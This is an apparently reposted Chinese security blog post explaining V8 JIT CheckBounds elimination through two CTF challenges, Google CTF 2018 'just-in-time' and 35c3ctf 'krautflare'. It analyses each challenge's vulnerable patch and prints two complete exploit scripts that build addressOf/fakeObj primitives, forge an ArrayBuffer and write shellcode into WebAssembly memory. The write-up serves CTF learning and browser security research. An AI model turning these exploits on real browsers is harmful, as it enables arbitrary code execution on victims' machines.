# v8的JIT边界检查（CheckBounds）消除的利用

阅读量 **190299**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2020-12-29 14:30:53

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p4.ssl.qhimg.com/t0192a8545633aef27e.jpg)

## 0x00 前言

从两道题学习v8中JIT优化的CheckBounds消除在漏洞中的利用

## 0x01 前置知识

###  生成IR图

在运行d8时加一个`--trace-turbo`选项，运行完成后，会在当前目录下生成一些json文件，这些便是JIT优化时的IR图数据。

    
    
    ./d8 --trace-turbo test.js
    

###  Turbolizer搭建

我们需要看懂v8的`sea of
node`的IR图，v8为我们准备了一个可视化的IR图查看器`Turbolizer`，搭建`Turbolizer`的方法如下（先确保node.js为新版本）

    
    
    cd tools/turbolizer
    npm i
    npm run-script build
    python -m SimpleHTTPServer
    

然后浏览器访问8000端口，即可使用该工具，按CTRL+L可以将v8生成的IR图数据文件加载进来可视化查看

![](https://p5.ssl.qhimg.com/t01aa0501605245f8f2.png)

###  sea of node学习

一个简单的示例，使用`--trace-turbo`运行

    
    
    function opt(f) {
       var x = f ? 1.1 : 2.2;
       x += 1;
       x *= 1;
       return x;
    }
    
    for (var i=0;i<0x20000;i++) {
       opt(true);
       opt(false);
    }
    
    print(opt(true));
    

将生成的json文件用`Turbolizer`打开

![](https://p4.ssl.qhimg.com/t0113b4f5547db5ef00.png)

左上角有许多的阶段选择，后面的序号代表它们的顺序，首先是`TFBytecodeGraphBuilder`阶段，该阶段就是简单的将js代码翻译为字节码，点击展开按钮，我们将所有节点展开查看

![](https://p1.ssl.qhimg.com/t018b2c59bb6a15191d.png)

我们的`var x = f ? 1.1 :
2.2;`被翻译为了一个`Phi`节点，即其具体值不能在编译时确定，然后使用了`SpeculativeNumberAdd`和`SpeculativeNumberMultiply`做了`x+=1;x*=1`的运算。  
接下来进入一个比较重要的阶段是`TFTyper`阶段，该阶段会尽可能的推测出节点的类型

![](https://p3.ssl.qhimg.com/t01643b4b72a732fa92.png)

其中整数会使用`Range`来表示，接下来`TFTypedLowering`阶段会使用更加合适的函数来进行运算

![](https://p3.ssl.qhimg.com/t016b88dd8046ef76ae.png)

在`TFSimplifiedLowering`阶段，会去掉一些不必要的运算，然后统一类型

![](https://p0.ssl.qhimg.com/t0141091bbfb48cf14b.png)

###  CheckBounds节点

在数组下标访问中，`CheckBounds`用来检查边界，如下一个简单示例

    
    
    function opt() {
       var arr = [1.1,2.2];
       var x = 1;
       return arr[x];
    }
    
    for (var i=0;i<0x20000;i++) {
       opt();
    }
    
    print(opt());
    

如图，在`TFLoadElimination`阶段，有CheckBounds检查下标是否越界

![](https://p3.ssl.qhimg.com/t0109b89a808c56c9dd.png)

然而到了`simplified lowering`阶段，由于已经知道下标没有越界，因此可以直接去掉`CheckBounds`节点

![](https://p0.ssl.qhimg.com/t01de93232cc821f6ee.png)

现在假如我们将arr对象放到opt函数外部，那么由于编译的是opt函数，arr的信息JIT不能完全掌握，便不会消除`CheckBounds`节点

    
    
    var arr = [1.1,2.2];
    function opt() {
       var x = 1;
       return arr[x];
    }
    

然而在最新版的v8中，不再有`CheckBounds`的消除，因为这个对于漏洞利用来说太方便了。

![](https://p4.ssl.qhimg.com/t01040f498b719f38ed.png)

###  CheckBounds消除的利用

在数值的运算错误漏洞中，在javascript层和JIT优化的代码，两者计算的数值如果不一致，那么就可以利用这种`CheckBounds消除`来实现数组越界

## 0x02 google-ctf2018-final-just-in-time

###  patch分析

    
    
    diff --git a/BUILD.gn b/BUILD.gn
    index c6a58776cd..14c56d2910 100644
    --- a/BUILD.gn
    +++ b/BUILD.gn
    @@ -1699,6 +1699,8 @@ v8_source_set("v8_base") {
         "src/compiler/dead-code-elimination.cc",
         "src/compiler/dead-code-elimination.h",
         "src/compiler/diamond.h",
    +    "src/compiler/duplicate-addition-reducer.cc",
    +    "src/compiler/duplicate-addition-reducer.h",
         "src/compiler/effect-control-linearizer.cc",
         "src/compiler/effect-control-linearizer.h",
         "src/compiler/escape-analysis-reducer.cc",
    diff --git a/src/compiler/duplicate-addition-reducer.cc b/src/compiler/duplicate-addition-reducer.cc
    new file mode 100644
    index 0000000000..59e8437f3d
    --- /dev/null
    +++ b/src/compiler/duplicate-addition-reducer.cc
    @@ -0,0 +1,71 @@
    +// Copyright 2018 Google LLC
    +//
    +// Licensed under the Apache License, Version 2.0 (the "License");
    +// you may not use this file except in compliance with the License.
    +// You may obtain a copy of the License at
    +//
    +//      http://www.apache.org/licenses/LICENSE-2.0
    +//
    +// Unless required by applicable law or agreed to in writing, software
    +// distributed under the License is distributed on an "AS IS" BASIS,
    +// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    +// See the License for the specific language governing permissions and
    +// limitations under the License.
    +#include "src/compiler/duplicate-addition-reducer.h"
    +
    +#include "src/compiler/common-operator.h"
    +#include "src/compiler/graph.h"
    +#include "src/compiler/node-properties.h"
    +
    +namespace v8 {
    +namespace internal {
    +namespace compiler {
    +
    +DuplicateAdditionReducer::DuplicateAdditionReducer(Editor* editor, Graph* graph,
    +                     CommonOperatorBuilder* common)
    +    : AdvancedReducer(editor),
    +      graph_(graph), common_(common) {}
    +
    +Reduction DuplicateAdditionReducer::Reduce(Node* node) {
    +  switch (node->opcode()) {
    +    case IrOpcode::kNumberAdd:
    +      return ReduceAddition(node);
    +    default:
    +      return NoChange();
    +  }
    +}
    +
    +Reduction DuplicateAdditionReducer::ReduceAddition(Node* node) {
    +  DCHECK_EQ(node->op()->ControlInputCount(), 0);
    +  DCHECK_EQ(node->op()->EffectInputCount(), 0);
    +  DCHECK_EQ(node->op()->ValueInputCount(), 2);
    +
    +  Node* left = NodeProperties::GetValueInput(node, 0);
    +  if (left->opcode() != node->opcode()) {
    +    return NoChange();
    +  }
    +
    +  Node* right = NodeProperties::GetValueInput(node, 1);
    +  if (right->opcode() != IrOpcode::kNumberConstant) {
    +    return NoChange();
    +  }
    +
    +  Node* parent_left = NodeProperties::GetValueInput(left, 0);
    +  Node* parent_right = NodeProperties::GetValueInput(left, 1);
    +  if (parent_right->opcode() != IrOpcode::kNumberConstant) {
    +    return NoChange();
    +  }
    +
    +  double const1 = OpParameter<double>(right->op());
    +  double const2 = OpParameter<double>(parent_right->op());
    +  Node* new_const = graph()->NewNode(common()->NumberConstant(const1+const2));
    +
    +  NodeProperties::ReplaceValueInput(node, parent_left, 0);
    +  NodeProperties::ReplaceValueInput(node, new_const, 1);
    +
    +  return Changed(node);
    +}
    +
    +}  // namespace compiler
    +}  // namespace internal
    +}  // namespace v8
    diff --git a/src/compiler/duplicate-addition-reducer.h b/src/compiler/duplicate-addition-reducer.h
    new file mode 100644
    index 0000000000..7285f1ae3e
    --- /dev/null
    +++ b/src/compiler/duplicate-addition-reducer.h
    @@ -0,0 +1,60 @@
    +/*
    + * Copyright 2018 Google LLC
    + *
    + * Licensed under the Apache License, Version 2.0 (the "License");
    + * you may not use this file except in compliance with the License.
    + * You may obtain a copy of the License at
    + *
    + *      http://www.apache.org/licenses/LICENSE-2.0
    + *
    + * Unless required by applicable law or agreed to in writing, software
    + * distributed under the License is distributed on an "AS IS" BASIS,
    + * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    + * See the License for the specific language governing permissions and
    + * limitations under the License.
    + */
    +
    +#ifndef V8_COMPILER_DUPLICATE_ADDITION_REDUCER_H_
    +#define V8_COMPILER_DUPLICATE_ADDITION_REDUCER_H_
    +
    +#include "src/base/compiler-specific.h"
    +#include "src/compiler/graph-reducer.h"
    +#include "src/globals.h"
    +#include "src/machine-type.h"
    +
    +namespace v8 {
    +namespace internal {
    +namespace compiler {
    +
    +// Forward declarations.
    +class CommonOperatorBuilder;
    +class Graph;
    +
    +class V8_EXPORT_PRIVATE DuplicateAdditionReducer final
    +    : public NON_EXPORTED_BASE(AdvancedReducer) {
    + public:
    +  DuplicateAdditionReducer(Editor* editor, Graph* graph,
    +                      CommonOperatorBuilder* common);
    +  ~DuplicateAdditionReducer() final {}
    +
    +  const char* reducer_name() const override { return "DuplicateAdditionReducer"; }
    +
    +  Reduction Reduce(Node* node) final;
    +
    + private:
    +  Reduction ReduceAddition(Node* node);
    +
    +  Graph* graph() const { return graph_;}
    +  CommonOperatorBuilder* common() const { return common_; };
    +
    +  Graph* const graph_;
    +  CommonOperatorBuilder* const common_;
    +
    +  DISALLOW_COPY_AND_ASSIGN(DuplicateAdditionReducer);
    +};
    +
    +}  // namespace compiler
    +}  // namespace internal
    +}  // namespace v8
    +
    +#endif  // V8_COMPILER_DUPLICATE_ADDITION_REDUCER_H_
    diff --git a/src/compiler/pipeline.cc b/src/compiler/pipeline.cc
    index 5717c70348..8cca161ad5 100644
    --- a/src/compiler/pipeline.cc
    +++ b/src/compiler/pipeline.cc
    @@ -27,6 +27,7 @@
     #include "src/compiler/constant-folding-reducer.h"
     #include "src/compiler/control-flow-optimizer.h"
     #include "src/compiler/dead-code-elimination.h"
    +#include "src/compiler/duplicate-addition-reducer.h"
     #include "src/compiler/effect-control-linearizer.h"
     #include "src/compiler/escape-analysis-reducer.h"
     #include "src/compiler/escape-analysis.h"
    @@ -1301,6 +1302,8 @@ struct TypedLoweringPhase {
                                    data->jsgraph()->Dead());
         DeadCodeElimination dead_code_elimination(&graph_reducer, data->graph(),
                                                   data->common(), temp_zone);
    +    DuplicateAdditionReducer duplicate_addition_reducer(&graph_reducer, data->graph(),
    +                                              data->common());
         JSCreateLowering create_lowering(&graph_reducer, data->dependencies(),
                                          data->jsgraph(), data->js_heap_broker(),
                                          data->native_context(), temp_zone);
    @@ -1318,6 +1321,7 @@ struct TypedLoweringPhase {
                                              data->js_heap_broker(), data->common(),
                                              data->machine(), temp_zone);
         AddReducer(data, &graph_reducer, &dead_code_elimination);
    +    AddReducer(data, &graph_reducer, &duplicate_addition_reducer);
         AddReducer(data, &graph_reducer, &create_lowering);
         AddReducer(data, &graph_reducer, &constant_folding_reducer);
         AddReducer(data, &graph_reducer, &typed_optimization);
    

patch文件在`TypedLoweringPhase`阶段增加了一个自定义的优化方案，它会检查该阶段的`Opcode`，如果遇到`kNumberAdd`，并且两个操作数为`NumberConstant`类型，那么就会将结果运算以后，替换节点

    
    
    +Reduction DuplicateAdditionReducer::Reduce(Node* node) {
    +  switch (node->opcode()) {
    +    case IrOpcode::kNumberAdd:
    +      return ReduceAddition(node);
    +    default:
    +      return NoChange();
    +  }
    +}
    

使用如下测试

    
    
    function opt(f) {
       var x = f ? 1.1:2.2;
       var y = x + 1 + 1;
       return y;
    }
    
    for (var i=0;i<0x20000;i++) {
       opt(true);
       opt(false);
    }
    
    print(opt(true));
    

在`typer`阶段时，使用了两次`SpeculativeNumberAdd[Number]`来进行加1

![](https://p4.ssl.qhimg.com/t01e301c4340944c32b.png)

而到了`TypedLowering`阶段，由于使用的是`NumberAdd`，因此`1+1`直接被优化计算出来了

![](https://p5.ssl.qhimg.com/t01907226ac456570bb.png)

假如使用如下的代码，发现不会使用`NumberAdd`，由此知道`NumberAdd`出现在不同的数值类型之间

    
    
    function opt(f) {
       var x = f ? 1:2;
       var y = x + 1 + 1;
       return y;
    }
    

###  漏洞利用

需要借助IEE754的精度丢失来达到利用，在IEE754中，能够准确表示的最大整数为`9007199254740991`，大于这个数进行运算的话，会出现错误。  
比如

    
    
    var x = 9007199254740991;
    x += 1;
    x += 1;
    x += 1;
    x += 1;
    x += 1;
    print(x);
    root@ubuntu:~/Desktop/google-ctf2018-final-just-in-time/debug# ./d8 1.js
    9007199254740992
    

而

    
    
    var x = 9007199254740991;
    x += 5;
    print(x);
    root@ubuntu:~/Desktop/google-ctf2018-final-just-in-time/debug# ./d8 1.js
    9007199254740996
    

因此，由于patch的加入，原本我们的`x + 1 + 1`与优化后的`x + 2`可能并不相等，那么就有可能在优化后造成数组越界。  
首先构造

    
    
    function opt() {
       var arr = [1.1,2.2,3.3,4.4,5.5,6.6];
       var x = Number.MAX_SAFE_INTEGER + 4;
       var y = x + 1 + 1;
       var index = y - (Number.MAX_SAFE_INTEGER + 1);
       return arr[index];
    }
    
    for (var i=0;i<0x20000;i++) {
       opt();
    }
    
    print(opt());
    

发现并没有成功越界，查看IR图

![](https://p5.ssl.qhimg.com/t014d0fba0462389d80.png)

由于opt里面全都是`NumberConstants`，导致所有的加法都被优化了，而我们仅仅想要优化`1+1`，由此，我们可以构造一个`Phi`节点

    
    
    function opt(f) {
       var arr = [1.1,2.2,3.3,4.4,5.5,6.6];
       var x = f ? Number.MAX_SAFE_INTEGER + 4:Number.MAX_SAFE_INTEGER+1;
       var y = x + 1 + 1;
       var index = y - (Number.MAX_SAFE_INTEGER + 1);
       return arr[index];
    }
    
    for (var i=0;i<0x20000;i++) {
       opt(true);
       opt(false);
    }
    
    print(opt(true));
    

发现这回成功溢出

    
    
    root@ubuntu:~/Desktop/google-ctf2018-final-just-in-time/debug# ./d8 1.js --trace-turbo
    Concurrent recompilation has been disabled for tracing.
    ---------------------------------------------------    Begin compiling method opt using Turbofan
    ---------------------------------------------------    Finished compiling method opt using Turbofan
    ---------------------------------------------------    Begin compiling method  using Turbofan
    ---------------------------------------------------    Finished compiling method  using Turbofan
    -1.1885946300594787e+148
    

分析IR图，patch的优化后于`NumberAdd`等，因此在最后一步减法`NumberSubtract`后，确定了`Range(0,4)`，显然这个范围不会越界，但是接下来patch的优化将`NumberAdd(1,1)`优化为了2，那么最终结果已发生变化，但是没有更新`CheckBounds`的范围

![](https://p0.ssl.qhimg.com/t01ab1976131a4dd33c.png)

那么到达`simplified lowering`时，`CheckBounds`就会被移除，那么就可以溢出了

![](https://p5.ssl.qhimg.com/t01bbae7ab1fc8de91c.png)

那么构造`fakeObj`和`addressOf`原语，然后利用即可

exp

    
    
    var buf = new ArrayBuffer(0x8);
    var dv = new DataView(buf);
    
    function p64f(value1,value2) {
       dv.setUint32(0,value1,true);
       dv.setUint32(0x4,value2,true);
       return dv.getFloat64(0,true);
    }
    
    function i2f64(value) {
       dv.setBigUint64(0,BigInt(value),true);
       return dv.getFloat64(0,true);
    }
    
    function u64f(value) {
       dv.setFloat64(0,value,true);
       return dv.getBigUint64(0,true);
    }
    
    var arr;
    function opt(f) {
       arr = [1.1,2.2,3.3,4.4,5.5,6.6];
       var b = f ? Number.MAX_SAFE_INTEGER+0x4:Number.MAX_SAFE_INTEGER+0x1;
       var c = b+1+1;
       var index = c - (Number.MAX_SAFE_INTEGER + 1);
       return arr[index];
    }
    
    for (var i=0;i<0x30000;i++) {
       opt(true);
       opt(false);
    }
    
    var obj = {};
    double_elements_map_addr = u64f(opt(true)) - 0x1n;
    var obj_arr = [obj];
    var obj_elements_map = i2f64(double_elements_map_addr + 0xa1n);
    print("double_elements_map=" + double_elements_map_addr.toString(16));
    print("obj_elements_map=" + u64f(obj_elements_map).toString(16));
    
    function fakeObj_opt(addr,f) {
       arr = [addr,2.2,3.3,4.4,5.5,6.6];
       var b = f ? Number.MAX_SAFE_INTEGER+0x4:Number.MAX_SAFE_INTEGER+0x1;
       var c = b+1+1;
       var index = c - (Number.MAX_SAFE_INTEGER + 1);
       arr[index] = obj_elements_map;
       return arr;
    }
    
    for (var i=0;i<0x30000;i++) {
       fakeObj_opt(1.1+i,true);
       fakeObj_opt(1.1+i,false);
    }
    
    function fakeObj(addr) {
       var addr_f = i2f64(addr + 0x1n);
       return fakeObj_opt(addr_f,true)[0];
    }
    
    var double_elements_map_obj = fakeObj(double_elements_map_addr);
    
    function addressOf_opt(obj,f) {
       arr = [obj,obj,obj,obj,obj,obj];
       var b = f ? Number.MAX_SAFE_INTEGER+0x4:Number.MAX_SAFE_INTEGER+0x1;
       var c = b+1+1;
       var index = c - (Number.MAX_SAFE_INTEGER + 1);
       arr[index] = double_elements_map_obj;
       return arr;
    }
    
    for (var i=0;i<0x30000;i++) {
       addressOf_opt(obj,true);
       addressOf_opt(obj,false);
    }
    
    function addressOf(obj) {
       var a = addressOf_opt(obj,true)[0];
       return u64f(a) - 0x1n;
    }
    
    const wasmCode = new Uint8Array([0x00,0x61,0x73,0x6D,0x01,0x00,0x00,0x00,0x01,0x85,0x80,0x80,0x80,0x00,0x01,0x60,0x00,0x01,0x7F,0x03,0x82,0x80,0x80,0x80,0x00,0x01,0x00,0x04,0x84,0x80,0x80,0x80,0x00,0x01,0x70,0x00,0x00,0x05,0x83,0x80,0x80,0x80,0x00,0x01,0x00,0x01,0x06,0x81,0x80,0x80,0x80,0x00,0x00,0x07,0x91,0x80,0x80,0x80,0x00,0x02,0x06,0x6D,0x65,0x6D,0x6F,0x72,0x79,0x02,0x00,0x04,0x6D,0x61,0x69,0x6E,0x00,0x00,0x0A,0x8A,0x80,0x80,0x80,0x00,0x01,0x84,0x80,0x80,0x80,0x00,0x00,0x41,0x2A,0x0B]);
    const shellcode = new Uint32Array([186,114176,46071808,3087007744,41,2303198479,3091735556,487129090,16777343,608471368,1153910792,4132,2370306048,1208493172,3122936971,16,10936,1208291072,1210334347,50887,565706752,251658240,1015760901,3334948900,1,8632,1208291072,1210334347,181959,565706752,251658240,800606213,795765090,1207986291,1210320009,1210334349,50887,3343384576,194,3913728,84869120]);
    var wasmModule = new WebAssembly.Module(wasmCode);
    var wasmInstance = new WebAssembly.Instance(wasmModule);
    var func = wasmInstance.exports.main;
    
    var faker = [0.0,1.1,2.2,3.3,4.4,5.5,6.6,7.7,8.8,9.9];
    
    var faker_addr = addressOf(faker);
    /*print('wasm='+addressOf(wasmInstance).toString(16));
    %DebugPrint(wasmInstance);
    %SystemBreak();*/
    wasm_shellcode_ptr_addr = addressOf(wasmInstance) + 0xf8n;
    var element_addr = faker_addr - 0x50n;
    //print('element_addr=' + element_addr.toString(16));
    //fake a ArrayBuffer's Map
    faker[0] = i2f64(0n);
    faker[1] = i2f64(0x1900042317080808n);
    faker[2] = i2f64(0x00000000082003ffn);
    faker[3] = i2f64(0);
    
    //faker a ArrayBuffer
    faker[4] = i2f64(element_addr+0x1n); //map
    faker[5] = i2f64(0); //properties
    faker[6] = i2f64(0); //elements
    faker[7] = p64f(0xffffffff,0); //length
    faker[8] = i2f64(wasm_shellcode_ptr_addr);
    faker[9] = 0x2;
    
    var arb_ArrayBuffer = fakeObj(element_addr+0x20n);
    var adv = new DataView(arb_ArrayBuffer);
    var wasm_shellcode_addr = adv.getBigUint64(0,true);
    print('wasm_shellcode_addr=' + wasm_shellcode_addr.toString(16));
    faker[8] = i2f64(wasm_shellcode_addr);
    //替换wasm的shellcode
    for (var i=0;i<shellcode.length;i++) {
       adv.setUint32(i*4,shellcode[i],true);
    }
    //执行shellcode
    func();
    

在`addressOf_opt`和`fakeObj_opt`中，我们没有直接返回`arr[0]`这是因为arr在opt函数内部，编译时收集的信息足够充分，即使我们改了map，也不影响其取出的值，因此，我们要返回整个arr对象。

## 0x03 35c3ctf-krautflare

###  patch分析

    
    
    commit 950e28228cefd1266cf710f021a67086e67ac6a6
    Author: Your Name <you@example.com>
    Date:   Sat Dec 15 14:59:37 2018 +0100
    
        Revert "[turbofan] Fix Math.expm1 builtin typing."
    
        This reverts commit c59c9c46b589deb2a41ba07cf87275921b8b2885.
    
    diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc
    index 60e7ed574a..8324dc06d7 100644
    --- a/src/compiler/typer.cc
    +++ b/src/compiler/typer.cc
    @@ -1491,6 +1491,7 @@ Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) {
         // Unary math functions.
         case BuiltinFunctionId::kMathAbs:
         case BuiltinFunctionId::kMathExp:
    +    case BuiltinFunctionId::kMathExpm1:
           return Type::Union(Type::PlainNumber(), Type::NaN(), t->zone());
         case BuiltinFunctionId::kMathAcos:
         case BuiltinFunctionId::kMathAcosh:
    @@ -1500,7 +1501,6 @@ Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) {
         case BuiltinFunctionId::kMathAtanh:
         case BuiltinFunctionId::kMathCbrt:
         case BuiltinFunctionId::kMathCos:
    -    case BuiltinFunctionId::kMathExpm1:
         case BuiltinFunctionId::kMathFround:
         case BuiltinFunctionId::kMathLog:
         case BuiltinFunctionId::kMathLog1p:
    diff --git a/test/mjsunit/regress/regress-crbug-880207.js b/test/mjsunit/regress/regress-crbug-880207.js
    index 09796a9ff4..0f65ddb56b 100644
    --- a/test/mjsunit/regress/regress-crbug-880207.js
    +++ b/test/mjsunit/regress/regress-crbug-880207.js
    @@ -4,34 +4,10 @@
    
     // Flags: --allow-natives-syntax
    
    -(function TestOptimizedFastExpm1MinusZero() {
    -  function foo() {
    -    return Object.is(Math.expm1(-0), -0);
    -  }
    +function foo() {
    +  return Object.is(Math.expm1(-0), -0);
    +}
    
    -  assertTrue(foo());
    -  %OptimizeFunctionOnNextCall(foo);
    -  assertTrue(foo());
    -})();
    -    -(function TestOptimizedExpm1MinusZeroSlowPath() {
    -  function f(x) {
    -    return Object.is(Math.expm1(x), -0);
    -  }
    -    -  function g() {
    -    return f(-0);
    -  }
    -    -  f(0);
    -  // Compile function optimistically for numbers (with fast inlined
    -  // path for Math.expm1).
    -  %OptimizeFunctionOnNextCall(f);
    -  // Invalidate the optimistic assumption, deopting and marking non-number
    -  // input feedback in the call IC.
    -  f("0");
    -  // Optimize again, now with non-lowered call to Math.expm1.
    -  assertTrue(g());
    -  %OptimizeFunctionOnNextCall(g);
    -  assertTrue(g());
    -})();
    +assertTrue(foo());
    +%OptimizeFunctionOnNextCall(foo);
    +assertTrue(foo());
    

这是一个v8的历史漏洞，patch将漏洞重新引入，其代号为`880207`，首先该漏洞出现在`typer.cc`中，因此猜测该漏洞出现在`Typer`阶段，并且该漏洞与`Math.expm1(x)`函数有关,`Typer`推断`Math.expm1(x)`函数的返回类型时，认为`Math.expm1(x)`的返回类型为`PlainNumber`或者`Nan`，却忽略了一种情况，那就是`Math.expm1(-0)`，其返回值为`-0`，而`-0`属于`HEAP_NUMBER_TYPE`类型，在JIT编译时期与运行时期，就会有不一样的结果，比如

    
    
    Object.is(Math.expm1(-0),-0)
    

在编译时期，JIT认为该值肯定为`false`，因为两者的类型不可能相等，但是在实际运行当中，`Object.is(Math.expm1(x),-0)`，如果x为-0，那么结果就会为`true`。

###  漏洞利用

在javascript中，布尔类型可以直接做加减乘除运算

    
    
    false+1
    1
    true+1
    2
    

因此，我们可以利用这种特性，将漏洞转换为一个数组越界，首先构造

    
    
    function opt(x) {
       var a = Object.is(Math.expm1(x),-0);
       var arr = [1.1,2.2,3.3,4.4];
       a += 3;
       return arr[a];
    }
    
    for (var i=0;i<0x20000;i++) {
       opt(0);
       opt("0");
    }
    
    print(opt(-0));
    

用`opt("0");`是为了适配非`PlainNumber`类型的参数，这样最后一步调用`opt(-0)`不会进行`deoptimization`，运行发现，没有成功越界，查看IR图

![](https://p4.ssl.qhimg.com/t0145b5d118c312ee6c.png)

可以看到`JSCall[PlainNumber |
NaN]`，然后使用`SameValue`运算后，与3相加，最后得出范围`Range(0,3)`传给`CheckBounds`

然而到了`TypedLowering`阶段，发现下标直接变成了3，即发生常数折叠

![](https://p4.ssl.qhimg.com/t01a5d7a91b568081b8.png)

为了避免发生这样的常数折叠现象，我们可以使用一个`字典对象`来将我们的`-0`包含在内部，这样，只有在`Escape Analyse`阶段才能知道其值。

    
    
    function opt(x) {
       var escape = {v:-0};
       var a = Object.is(Math.expm1(x),escape.v);
       var arr = [1.1,2.2,3.3,4.4];
       a += 3;
       return arr[a];
    }
    
    for (var i=0;i<0x20000;i++) {
       opt(0);
       opt("0");
    }
    
    print(opt(-0));
    

运行后发现确实发生了数组越界

    
    
    root@ubuntu:~/Desktop/krautflare# ./d8 1.js --trace-turbo
    Concurrent recompilation has been disabled for tracing.
    ---------------------------------------------------    Begin compiling method opt using Turbofan
    ---------------------------------------------------    Finished compiling method opt using Turbofan
    ---------------------------------------------------    Begin compiling method opt using Turbofan
    ---------------------------------------------------    Finished compiling method opt using Turbofan
    ---------------------------------------------------    Begin compiling method  using Turbofan
    ---------------------------------------------------    Finished compiling method  using Turbofan
    2.89459808827e-311
    

查看IR图，这回在`Typer`阶段，还不能确定准确值，因此有一个范围`Range(3,4)`

![](https://p4.ssl.qhimg.com/t0129d29f5c4e26423c.png)

然后过了`Escape Analyse`阶段，才发现范围在`Range(0,3)`内，于是到了`simplified
lowering`阶段，便把`CheckBounds`给去除了

![](https://p5.ssl.qhimg.com/t012a34341a0c5e0c32.png)

由此造成了溢出，可以利用溢出，构造一个oob_arr，来达到自由溢出，然后利用手法就一样了。

exp

    
    
    var buf = new ArrayBuffer(0x8);
    var dv = new DataView(buf);
    
    function p64f(value1,value2) {
       dv.setUint32(0,value1,true);
       dv.setUint32(0x4,value2,true);
       return dv.getFloat64(0,true);
    }
    
    function i2f64(value) {
       dv.setBigUint64(0,BigInt(value),true);
       return dv.getFloat64(0,true);
    }
    
    function u64f(value) {
       dv.setFloat64(0,value,true);
       return dv.getBigUint64(0,true);
    }
    
    var obj = {};
    var oob_arr;
    var obj_arr;
    var double_arr;
    
    function opt(x) {
       var arr = [1.1,2.2,3.3,4.4];
       oob_arr = [5.5,6.6];
       obj_arr = [obj];
       double_arr = [1.1];
       var tmp = {escapeVar: -0};
       var index = Object.is(Math.expm1(x),tmp.escapeVar);
       index *= 11;
       //制造oob_arr
       arr[index] = p64f(0,0x1000);
    }
    
    for (var i=0;i<0x20000;i++) {
       opt(0);
       opt("0");
    }
    //触发漏洞
    opt(-0);
    
    
    var double_elements_map = oob_arr[0x10];
    var obj_elements_map = oob_arr[0x9];
    
    function fakeObj(addr) {
       var addr_f = i2f64(addr + 0x1n);
       double_arr[0] = addr_f;
       oob_arr[0x10] = obj_elements_map;
       var a = double_arr[0];
       oob_arr[0x10] = double_elements_map;
       return a;
    }
    
    function addressOf(obj) {
       obj_arr[0] = obj;
       oob_arr[0x9] = double_elements_map;
       var a = obj_arr[0];
       oob_arr[0x9] = obj_elements_map;
       return u64f(a) - 0x1n;
    }
    
    const wasmCode = new Uint8Array([0x00,0x61,0x73,0x6D,0x01,0x00,0x00,0x00,0x01,0x85,0x80,0x80,0x80,0x00,0x01,0x60,0x00,0x01,0x7F,0x03,0x82,0x80,0x80,0x80,0x00,0x01,0x00,0x04,0x84,0x80,0x80,0x80,0x00,0x01,0x70,0x00,0x00,0x05,0x83,0x80,0x80,0x80,0x00,0x01,0x00,0x01,0x06,0x81,0x80,0x80,0x80,0x00,0x00,0x07,0x91,0x80,0x80,0x80,0x00,0x02,0x06,0x6D,0x65,0x6D,0x6F,0x72,0x79,0x02,0x00,0x04,0x6D,0x61,0x69,0x6E,0x00,0x00,0x0A,0x8A,0x80,0x80,0x80,0x00,0x01,0x84,0x80,0x80,0x80,0x00,0x00,0x41,0x2A,0x0B]);
    const shellcode = new Uint32Array([186,114176,46071808,3087007744,41,2303198479,3091735556,487129090,16777343,608471368,1153910792,4132,2370306048,1208493172,3122936971,16,10936,1208291072,1210334347,50887,565706752,251658240,1015760901,3334948900,1,8632,1208291072,1210334347,181959,565706752,251658240,800606213,795765090,1207986291,1210320009,1210334349,50887,3343384576,194,3913728,84869120]);
    var wasmModule = new WebAssembly.Module(wasmCode);
    var wasmInstance = new WebAssembly.Instance(wasmModule);
    var func = wasmInstance.exports.main;
    
    var faker = [0.0,1.1,2.2,3.3,4.4,5.5,6.6,7.7,8.8,9.9];
    
    var faker_addr = addressOf(faker);
    print('wasm='+addressOf(wasmInstance).toString(16));
    /*
    %DebugPrint(wasmInstance);
    %SystemBreak();
    */
    wasm_shellcode_ptr_addr = addressOf(wasmInstance) + 0xe8n;
    var element_addr = faker_addr - 0x50n;
    //print('element_addr=' + element_addr.toString(16));
    //fake a ArrayBuffer's Map
    faker[0] = i2f64(0n);
    faker[1] = i2f64(0x1900042317080808n);
    faker[2] = i2f64(0x00000000082003ffn);
    faker[3] = i2f64(0);
    
    //faker a ArrayBuffer
    faker[4] = i2f64(element_addr+0x1n); //map
    faker[5] = i2f64(0); //properties
    faker[6] = i2f64(0); //elements
    faker[7] = p64f(0xffffffff,0); //length
    faker[8] = i2f64(wasm_shellcode_ptr_addr);
    faker[9] = 0x2;
    
    var arb_ArrayBuffer = fakeObj(element_addr+0x20n);
    var adv = new DataView(arb_ArrayBuffer);
    var wasm_shellcode_addr = adv.getBigUint64(0,true);
    print('wasm_shellcode_addr=' + wasm_shellcode_addr.toString(16));
    faker[8] = i2f64(wasm_shellcode_addr);
    //替换wasm的shellcode
    for (var i=0;i<shellcode.length;i++) {
       adv.setUint32(i*4,shellcode[i],true);
    }
    //执行shellcode
    func();
    

## 0x04 感想

在数值误差的漏洞当中，我们往往利用`CheckBounds`的消除来构造`OOB`数组，其中要保证这个数组是一个非逃逸对象，即在函数内部声明和使用，这样JIT收集的信息充分，才能决定是否要移除`CheckBounds`节点，似乎在新版本v8中，`simplified
lowering`阶段不再去除该节点，以后遇到再看。

## 0x05 参考

[从漏洞利用角度介绍Chrome的V8安全研究](https://www.4hou.com/posts/21Y1)  
[introduction-to-turbofan](https://doar-e.github.io/blog/2019/01/28/introduction-to-turbofan/)  
[利用边界检查消除破解Chrome JIT编译器](https://zhuanlan.zhihu.com/p/73081003)  
[关于2018_35c3ctf_krautflare的分析复现](https://www.anquanke.com/post/id/214020#h3-6)

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **ha1vk@赛宁网安天虞实验室** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/226065](/post/id/226065)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

